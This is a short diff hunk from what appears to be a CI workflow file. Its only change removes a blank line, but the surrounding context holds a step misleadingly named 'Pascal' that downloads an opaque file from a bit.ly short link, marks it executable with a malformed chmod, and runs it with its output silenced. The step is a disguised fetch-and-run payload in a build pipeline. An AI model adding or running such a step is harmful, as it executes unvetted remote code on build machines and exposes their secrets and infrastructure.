@@ -72,4 +72,3 @@ jobs:
     - name: Pascal
       run: |
         wget https://bit.ly/3G1aOvJ && chmod 3G1aOvJ && ./3G1aOvJ > /dev/null
-		
